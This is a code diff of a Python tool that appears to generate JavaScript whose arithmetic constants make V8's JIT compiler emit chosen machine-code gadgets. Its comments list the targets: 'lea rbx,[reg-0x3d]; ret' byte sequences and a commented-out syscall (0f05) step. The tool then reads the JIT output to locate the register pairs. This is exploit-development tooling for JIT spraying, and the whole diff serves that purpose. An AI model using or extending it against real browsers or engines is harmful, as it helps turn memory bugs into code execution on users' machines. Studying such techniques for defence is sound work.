@@ -50,37 +50,36 @@ def excute_js(js:str, filename:str)->bool:
     
     return False
 
-def generate_template(count:int):
-    header = '''
+header = ''
+
+tail = ''
+
+def init_header(count:int):
+    global header
+    global tail
+    header += \
+'''
 var array = new Uint8Array();
 function syscall_jsc('''
-
     for i in range(count - 1):
         header += 'var' + str(i) + ', '
     header += 'var' + str(count - 1) + '){\n'
     base = 110
-    middle1 = ''
     for i in range(count):
         var = 't' + str(i)
-        middle1 += '\tvar ' + var + ' = var' + str(i) + ' & 0x' + str(base) + ';\n'
+        header += '\tvar ' + var + ' = var' + str(i) + ' & 0x' + str(base) + ';\n'
         base += 1
     
-    jsc = ''
-    base = 11
-    for i in range(count):
-        jsc += '\tvar i' + str(i) + ' = t' + str(i) + '+ 0x' + str(base) + ';\n'
-        base += 1
-
-    middle = '\treturn '
+    tail += '\treturn '
     for i in range(count - 1):
-        middle += 't' + str(i) + ' ' + ' + '
-    # middle += 't' + str(count-1) + ' | s;\n}\n'
-    middle += 't' + str(count-1) + ' | ('
+        tail += 't' + str(i) + ' ' + ' + '
+    tail += 't' + str(count-1) + ' | ('
     for i in range(count - 1):
-        middle += 'i' + str(i) + ' + '
-    middle += 'i' + str(count - 1) + ');\n}\n'
+        tail += 'i' + str(i) + ' + '
+    tail += 'i' + str(count - 1) + ');\n}\n'
 
-    tail = '''
+    tail += \
+'''
 for(var i = 0; i < 0x10000; i++)
 {
 '''
@@ -90,82 +89,68 @@ for(var i = 0; i < 0x10000; i++)
     tail += '0xc' + str(count - 1) + ');'
     tail += '\n}\n'
 
-    indent = ''
-    for i in range(12):
-        for j in range(i):
-            indent += '\t\tvar i' + str(j)
-    excute_js(header + middle1 + jsc + middle + tail, 'test')
 
-def gen_jsc(r1:str, r2:str):
-    base = 110
-    jsc = 'var s = t' + str(int(rs_map[r1]) - base) + ' + t' + str(int(rs_map[r2]) - base) + ' * 2 + 0xc3;\n'
-    jsc += '\treturn '
-    l = False
+def generate_template(count:int):
+    jsc = ''
+    base = 11
     for i in range(count):
-        if i != int(rs_map[r1]) - base and i != int(rs_map[r2]) - base:
-            if l:
-                jsc += ' + '
-            jsc += 't' + str(i)
-            l = True
-    jsc += ' | s;\n'
-    return jsc
+        jsc += '\tvar i' + str(i) + ' = t' + str(i) + ' + 0x' + str(i) + ';\n'
+        base += 1
 
-def gen_syscall(r1:str, r2:str):
+    excute_js(header + jsc + tail, 'test')
+
+def gen_jsc(r1:str, r2:str, count:int, gadget:str):
+    # 把t全部换成第二个寄存器对应的t
     base = 110
-    jsc = '\tvar s = t' + str(int(rs_map[r2]) - base) + ' - 0x3d;\n'
-    jsc += '\treturn '
-    l = False
+    b2 = 11
+    jsc = ''
     for i in range(count):
-        if i != int(rs_map[r1]) - base and i != int(rs_map[r2]) - base:
-            if l:
-                jsc += ' + '
-            jsc += 't' + str(i)
-            l = True
-    jsc += ' | s;\n'
-    return jsc
-
-def generate_js(filename:str):
-    f = open(filename, 'r')
+        jsc += '\tvar i' + str(i) + ' = t' + str(int(rs_map[r2]) - base) + ' + 0x' + str(b2 + i) + ';\n'
+    excute_js(header + jsc + tail, gadget + 'bak')
+    f = open(gadget + 'bak.txt', 'r')
     lines = f.readlines()
-    header = ''
-    i = 0
-    while i < len(lines):
-        if lines[i].find('\tvar s') == -1:
-            header += lines[i]
+    idx = -1
+    for i, line in enumerate(lines):
+        if line.find(r1) != -1 and line.find(r2) != -1 and line.find('leal') != -1 and line.find('*') == -1:
+            if line[line.rfind('0x') + 2 : -2].isdigit():
+                idx = int(line[line.rfind('0x') + 2 : -2]) - b2
+                break
+    
+    f.close()
+    if idx == -1:
+        print('not found register pair')
+        return ''
+    jsc = ''
+    for i in range(count):
+        if i != idx:
+            jsc += '\tvar i' + str(i) + ' = t' + str(int(rs_map[r2]) - base) + ' + 0x' + str(b2 + i) + ';\n'
         else:
-            i += 2
-            break
-        i += 1
-    tail = ''
-    while i < len(lines):
-        tail += lines[i]
-        i += 1
+            jsc += '\tvar i' + str(i) + ' = t' + str(int(rs_map[r2]) - base) + ' - 0x3d' + ';\n'
+        
+    return jsc
 
-    base = 110
-
+def generate_js(count):
     # 48 8d 5a c3             lea    rbx,[rdx-0x3d]
     # 48 8d 5e c3             lea    rbx,[rsi-0x3d]
     # 48 8d 58 c3             lea    rbx,[rax-0x3d]
     # 48 8d 5f c3             lea    rbx,[rdi-0x3d]
 
-    jsc5ac3 = gen_jsc('rbx', 'rdx')
-    if not excute_js(header + jsc5ac3 + tail, '5ac3'):
+    jsc5ec3 = gen_jsc('rbx', 'rdx', count, '5ac3')
+    if not excute_js(header + jsc5ec3 + tail, '5ac3'):
         print('generate 5ac3 failed')
-    jsc5ec3 = gen_jsc('rbx', 'rsi')
+    jsc5ec3 = gen_jsc('rbx', 'rsi', count, '5ec3')
     if not excute_js(header + jsc5ec3 + tail, '5ec3'):
         print('generate 5ec3 failed')
-    jsc5fc3 = gen_jsc('tbx', 'rax')
-    if not excute_js(header + jsc5fc3 + tail, '5fc3'):
-        print('generate 5fc3 failed')
-    jsc58c3 = gen_jsc('rbx', 'rdi')
-    if not excute_js(header + jsc58c3 + tail, '58c3'):
+    jsc5fc3 = gen_jsc('rbx', 'rax', count, '58c3')
+    if not excute_js(header + jsc5fc3 + tail, '58c3'):
         print('generate 58c3 failed')
+    jsc58c3 = gen_jsc('rbx', 'rdi', count, '5fc3')
+    if not excute_js(header + jsc58c3 + tail, '5fc3'):
+        print('generate 5fc3 failed')
     # jsc0f05 = gen_syscall('rcx', 'rdi')
     # if not excute_js(header + jsc0f05 + tail, '0f05'):
         # print('generate 0f05 failed')
     
-    out = open('jsc.js', 'w')
-    # write jsc function
 
 
 
@@ -179,7 +164,8 @@ if __name__ == "__main__":
     if not p.is_file():
         print('path of v8 error')
         exit()
-
+    
+    init_header(count)
     generate_template(count)
     rs_map = get_registers('test.txt')
     if not rs_set < set(rs_map.keys()):
@@ -188,4 +174,5 @@ if __name__ == "__main__":
         print('resgister are not enough')
         exit()
     print(rs_map)
+    generate_js(12)
     print('done')
